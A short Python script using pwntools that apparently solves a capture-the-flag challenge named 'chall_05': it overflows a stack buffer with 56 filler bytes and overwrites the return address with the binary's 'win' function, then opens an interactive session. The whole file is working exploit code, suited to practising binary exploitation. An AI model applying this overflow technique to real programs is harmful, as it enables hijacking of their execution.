from pwn import *

binary = context.binary = ELF('./chall_05')

p = process("./chall_05")
p.recv()


payload  = b''
payload += 56 * b'A'
payload += p64(binary.sym.win)

p.sendline(payload)
p.interactive()
